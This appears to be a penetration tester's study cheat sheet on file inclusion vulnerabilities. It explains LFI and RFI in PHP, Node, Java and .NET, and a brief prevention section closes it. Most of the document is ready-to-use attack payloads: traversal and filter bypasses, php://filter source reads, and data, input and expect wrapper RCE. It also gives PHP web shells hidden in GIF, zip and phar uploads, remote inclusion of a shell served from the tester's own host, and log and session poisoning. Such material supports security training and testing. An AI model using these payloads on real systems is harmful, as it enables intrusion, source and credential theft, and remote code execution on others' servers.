# FILE INCLUSION

## INTRO TO FILE INCLUSIONS

Core mechanism: dynamic content loaded through a parameter (`?page=about` → backend pulls `about.php`). Templating engines are the classic case — static header/footer/nav wraps around a parameter-controlled dynamic chunk. Control that parameter, and you may be able to pull any file on the server instead of the intended one.

Impact scales with what the function actually does to the path: source disclosure → sensitive data exposure (DB creds, keys) → RCE, depending on the function's privileges.

Vulnerable functions by stack — same root cause everywhere, different function name:

```
PHP       include(), include_once(), require(), require_once(), file_get_contents()
NodeJS    fs.readFile(), res.render() (Express)
Java      <jsp:include>, <c:import>
.NET      Response.WriteFile(), @Html.Partial(), #include
```

PHP:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

NodeJS:

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

Express `render()` — param comes from the URL path, not a querystring:

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

Java:

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

.NET:

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

**Read vs Execute — know this before touching anything.** Some functions only dump file content back (source disclosure). Others actually execute it (RCE path). Some allow a remote URL as the "file," some don't:

```
PHP
  include() / include_once()   → read, execute, remote URL
  require() / require_once()   → read, execute (local only)
  file_get_contents()          → read, remote URL (no execute)
  fopen() / file()             → read only

NodeJS
  fs.readFile() / fs.sendFile() → read only
  res.render()                  → read, execute

Java
  include → read only
  import  → read, execute, remote URL

.NET
  @Html.Partial() / Response.WriteFile() → read only
  @Html.RemotePartial()                   → read, remote URL (no execute)
  include                                  → read, execute, remote URL
```

Read-only still matters — source usually has DB creds, admin logic, other bugs baked in.

## LOCAL FILE INCLUSION (LFI)

**Basic LFI** — confirm the param pulls a file, not just switches a DB row, by swapping it for a known-readable target:

```
http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd
```

Windows equivalent: `C:\Windows\boot.ini`.

**Path traversal** — if your input gets a directory prepended (`"./languages/" . input`), an absolute path won't resolve since it just gets appended, not swapped. Chain `../` to climb back to root regardless of how deep the include point actually sits:

```
http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

Over-shooting `../` past root is harmless — you just stay at root. Throw in extra when unsure of depth. For a clean report, work out the real depth instead (`/var/www/html/` = 3 levels → exactly 3× `../`).

**Filename prefix** — if input gets a prefix instead of a directory (`"lang_" . input`), plain traversal breaks (`lang_../../../etc/passwd` isn't valid). Lead with a `/` so the prefix reads as a directory component (`lang_/`) instead of literally prefixing your path:

```
http://<TARGET_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

Not guaranteed — depends on `lang_/` resolving as a directory boundary at all. This same prefix issue also breaks wrapper- and RFI-based techniques later, since those need to control the very start of the string.

**Appended extensions** — `include(input . ".php")` turns your traversal into `/etc/passwd.php`, which doesn't exist. Bypasses for this live under Basic Bypasses / PHP Filters below.

**Second-order LFI** — payload doesn't go straight into the vulnerable function; it sits in storage first (username, DB field) and gets pulled later by an unrelated feature (`/profile/<username>/avatar.png`). Poison the stored value once (register with username `../../../etc/passwd`), then trigger whatever feature reads it back. Devs who sanitize direct params often trust anything already sitting in the DB — that's the gap.

## BASIC BYPASSES

**Non-recursive traversal filters** — a single-pass `str_replace('../', '', input)` only strips one layer. Feed it `....//` — it deletes the inner `../`, leaves `../` behind in the output. Variants: `..././`, `....\/`, extra slashes (`....////`).

```
http://<TARGET_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

**Encoding** — if `.` or `/` are themselves blacklisted, URL-encode the traversal so it doesn't match the filter as written but still decodes correctly once it hits the vulnerable function:

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

(= `../../../../etc/passwd` — every character encoded, dots included, since some encoders skip dots as "part of the URL scheme"). Double-encode with Burp Decoder against filters that decode twice. Same blacklisted-character bypass logic as command injection carries straight over here.

**Approved paths** — `preg_match('/^\.\/languages\/.+$/', input)` forces your string to start inside an allowed directory. Lead with that exact prefix, then traverse out of it:

```
http://<TARGET_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

Combine with encoding or the non-recursive trick if multiple filters are stacked together.

**Appended-extension bypasses (legacy PHP only)** — no bypass exists on modern PHP; being stuck reading `.php` files is still useful for source disclosure (see PHP Filters below). Two obsolete tricks, only against PHP <5.3/5.4:

- _Path truncation_ — old PHP capped strings at 4096 chars and silently dropped the rest, while also stripping trailing slashes/single-dots and collapsing repeated slashes. Pad with `./` repeated ~2048 times so the appended `.php` falls past the cutoff and gets truncated off. Needs a leading nonexistent directory to trigger:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

- _Null bytes_ — PHP <5.5 terminates strings at `%00` (C-string behavior). `/etc/passwd%00` becomes `/etc/passwd` once `.php` would've been appended after the null.

## PHP FILTERS

`php://filter/` wraps a resource and transforms it in-stream — `convert.base64-encode` is the one that matters here.

**Fuzz for PHP files first** — don't filter to just `200`, LFI doesn't care about the status a normal visitor would get blocked by:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<TARGET_IP>:<PORT>/FUZZ.php
```

Read what you find, grep for referenced files, repeat.

**Why base64, not raw inclusion** — directly including a `.php` file just executes it; a config file with no output gives you nothing back. Wrap it in the filter instead:

```
http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

(leave off `.php` — the app's own appended-extension behavior handles that, turning `resource=config` into `config.php`). Decode locally:

```bash
echo '<BASE64_STRING>' | base64 -d
```

Copy the entire encoded string or it won't decode cleanly — view page source if the rendered output looks truncated.

## PHP WRAPPERS

RCE, not just read. All three below need `allow_url_include = On` — check it first by reading php.ini through the filter trick:

```bash
curl "http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

```bash
echo '<BASE64_STRING>' | base64 -d | grep allow_url_include
```

(Nginx path: `/etc/php/X.Y/fpm/php.ini`. Try the newest installed version, step down if missing.) Not unusual to find this on — plenty of WordPress plugins/themes depend on it.

**data wrapper** — inline base64 PHP straight into the include, no upload needed:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```
http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_PAYLOAD>&cmd=id
```

URL-encode the base64 output first — `+`/`=` need escaping.

**input wrapper** — same idea, payload rides as POST body instead of the URL, so the param needs to accept POST:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

POST-only endpoint with no `$_REQUEST`? Hardcode the command instead of a dynamic shell: `<?php system('id')?>`.

**expect wrapper** — no shell payload needed, runs commands directly through the stream:

```
http://<TARGET_IP>:<PORT>/index.php?language=expect://id
```

Not enabled by default — `grep expect` in the same php.ini, but a config entry doesn't guarantee it actually loaded at runtime, so test execution directly regardless. Same wrapper shows up again with XXE, if that ever comes up.

## REMOTE FILE INCLUSION (RFI)

Any function permitting a remote URL as the "file" opens two doors: SSRF-style internal enumeration, or RCE by hosting your own script and pulling it in. RFI-capable usually means LFI-capable too (same function, just also takes a path) — but LFI doesn't guarantee RFI: the function might block remote URLs outright, you might not control the full scheme prefix, or server config disables it outright (the default posture on most modern setups).

**Verify before committing** — `allow_url_include` being on doesn't guarantee the specific function accepts remote URLs. Test with a local URL first, safer than reaching out externally:

```
http://<TARGET_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

Rendered as executed PHP (not dumped as text) = the function executes remote content too. Same trick doubles as internal port scanning — swap `:80` to enumerate what's listening locally. Don't include the vulnerable page itself — recursive self-inclusion = DoS.

**HTTP delivery**:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>
```

```
http://<TARGET_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

Use 80/443 for the listener — more likely whitelisted if there's egress filtering.

**FTP delivery** — useful when `http://` itself gets blocked (WAF string match) or the firewall's looser on FTP:

```bash
sudo python -m pyftpdlib -p 21
```

```
http://<TARGET_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

Anonymous auth by default; embed creds if the server needs them: `ftp://user:pass@<OUR_IP>/shell.php`.

**SMB delivery** — Windows targets only, skips `allow_url_include` entirely since Windows treats a remote SMB path as just another file via UNC path:

```bash
impacket-smbserver -smb2support share $(pwd)
```

```
http://<TARGET_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

Best odds on the same network — SMB over open internet is commonly blocked regardless of target config.

## LFI AND FILE UPLOADS

Doesn't need the upload form itself to be vulnerable — just needs to let you store a file at all. If the LFI function has Execute rights, whatever's inside the uploaded file runs on inclusion, extension and declared type be damned.

**Image upload** — bury a shell inside something that still passes as a valid image. GIF's the easy pick, magic bytes are plain ASCII:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload normally, grab the stored path (Inspector on the rendered `<img>`, or fuzz the uploads dir if hidden), include it:

```
http://<TARGET_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**Zip wrapper** — fallback if direct inclusion's blocked. Not enabled everywhere, and zip-content detection can flag it even under a `.jpg` name:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```
http://<TARGET_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

`%23` = encoded `#`, points at the sub-file inside the archive.

**Phar wrapper** — second fallback. Build a phar that writes your shell to a sub-file on dereference:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
http://<TARGET_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

Direct image-upload method is the reliable one — zip/phar are backups when it doesn't land. Edge case worth knowing exists: LFI + file uploads enabled + old PHP + an exposed `phpinfo()` page can also chain to RCE, but requirements are narrow enough it's rarely the first thing to try.

## LOG POISONING

Same idea both variants: get PHP code written somewhere that also gets logged, then `include` the log so it executes. Needs the app to have read access to whatever log you're targeting.

**PHP session poisoning** — session data lives at `/var/lib/php/sessions/sess_<PHPSESSID>` (Linux) or `C:\Windows\Temp\` (Windows). Check your own session file first for a stored field reflecting your input:

```
http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
```

If a field (e.g. `page`) mirrors your `?language=` param, poison it directly:

```
http://<TARGET_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

then include the session file with your command:

```
http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

The session file gets overwritten back on your next normal request through the app — re-poison before each shot, or use this first execution to drop a permanent web shell / catch a reverse shell so you're not repeating it.

**Server log poisoning** — `access.log` records `User-Agent` verbatim, and that header is entirely yours. Nginx logs are usually world-readable by low-priv users; Apache typically needs root/adm, though misconfigured or older boxes loosen that.

```
/var/log/apache2/access.log   (Linux)     C:\xampp\apache\logs\  (Windows)
/var/log/nginx/                            C:\nginx\log\
```

Confirm read access, then poison the header:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET_IP>:<PORT>/index.php" -H @Poison
```

include + trigger:

```
http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

Logs get big — inclusion can be slow or crash the server, so be deliberate outside a lab. No read access to the log files? `/proc/self/environ` or `/proc/self/fd/<0-50>` sometimes exposes the same User-Agent data, though these carry their own privilege restrictions too. Generalizes to any log you can both poison and read — `sshd.log`, `mail`, `vsftpd.log` included, if those services are exposed to you.

## AUTOMATED SCANNING

**Fuzzing parameters** — public forms tend to be hardened; params with no visible form behind them often aren't:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?FUZZ=value' -fs <BASELINE_SIZE>
```

**LFI wordlists** — fast first pass instead of hand-building payloads. LFI-Jhaddix.txt bundles bypasses + common target files:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=FUZZ' -fs <BASELINE_SIZE>
```

**Webroot discovery** — needed when an uploads dir isn't reachable relatively and has to be referenced absolutely instead:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE_SIZE>
```

**Server logs/configs** — same Jhaddix list covers common paths, or a dedicated Linux/Windows wordlist for a tighter scan:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <BASELINE_SIZE>
```

Chain manually when a wordlist doesn't hand you the log path directly — `apache2.conf` often references `${APACHE_LOG_DIR}` as a variable rather than a literal path, so pull `/etc/apache2/envvars` next to resolve what it actually points to.

**Tools** — LFISuite, LFIFreak, liffy exist and can save time on trivial cases, but most are unmaintained python2 relics now. Quick first pass, not a substitute for manual testing.

## FILE INCLUSION PREVENTION

**Core fix** — never let user input reach an inclusion function directly, full stop. Where the architecture can't be restructured, whitelist instead: map user input to a fixed set of legitimate values (DB table, static JSON map, case-match script) with a safe default for anything else — the _matched_ value goes into the function, never the raw input.

**Directory traversal** — use the framework's own filename-extraction function (`basename()` in PHP) rather than hand-rolled regex/replace. Hand-rolled sanitization has a documented edge case: bash treats `?`/`*` as wildcards standing in for `.` (`cat .?/.*/.?/etc/passwd` works), but PHP's own string handling doesn't — meaning if the app ever shells out via `system()`, an attacker can bypass an app-level filter that PHP alone would've caught. Recursive strip as a fallback where `basename()` isn't workable:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

**Server config** — disable remote inclusion outright (`allow_url_fopen` / `allow_url_include` → `Off`). Cage the app to its own webroot (`open_basedir = /var/www`, or containerize it). Disable modules you don't need (`expect`, `mod_userdir`).

**WAF** — ModSecurity or equivalent as a hardening layer, not a silver bullet. Run permissive/detection-only first to catch false positives before flipping to blocking — even permissive-only doubles as an early-warning tripwire on its own. Hardening buys time to detect, it doesn't make the app unhackable (average breach dwell time in FireEye's 2020 M-Trends report was still ~30 days) — keep watching logs regardless of how hardened the stack looks.